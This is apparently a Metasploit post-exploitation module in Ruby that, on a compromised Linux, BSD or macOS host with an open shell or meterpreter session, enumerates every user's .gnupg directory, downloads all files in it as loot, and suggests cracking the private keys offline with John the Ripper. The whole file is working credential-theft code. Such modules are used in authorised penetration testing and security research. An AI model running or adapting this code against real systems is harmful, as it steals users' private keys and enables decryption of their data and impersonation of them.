##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Common
	include Msf::Post::Unix

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Gather GnuPG Credentials Collection',
			'Description'    => %q{
					This module will collect the contents of user's .gpg directory on the targeted
				machine. Password protected private key files can be cracked with JtR.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Dhiru Kholia <dhiru at openwall.com>'],
			'Version'        => "$Revision$",
			'Platform'       => ['linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell' ]
		))
	end

	# This module is largely based on ssh_creds and firefox_creds.rb.

	def run
		print_status("Finding .gnupg directories")
		paths = enum_user_directories.map {|d| d + "/.gnupg"}
		# Array#select! is only in 1.9
		paths = paths.select { |d| directory?(d) }

		if paths.nil? or paths.empty?
			print_error("No users found with a .gnupg directory")
			return
		end

		download_loot(paths)
	end

	def download_loot(paths)
		print_status("Looting #{paths.count} directories")
		paths.each do |path|
			path.chomp!
			if session.type == "meterpreter"
				sep = session.fs.file.separator
				files = session.fs.dir.entries(path)
			else
				# Guess, but it's probably right
				sep = "/"
				files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
			end

			files.each do |file|
				print_good("Downloading #{path}#{sep}#{file} -> #{file}")
				data = read_file("#{path}#{sep}#{file}")
				file = file.split(sep).last
				loot_path = store_loot("gpg.#{file}", "text/plain", session, data,
					"gpg_#{file}", "GnuPG #{file} File")
			end

		end
	end

end
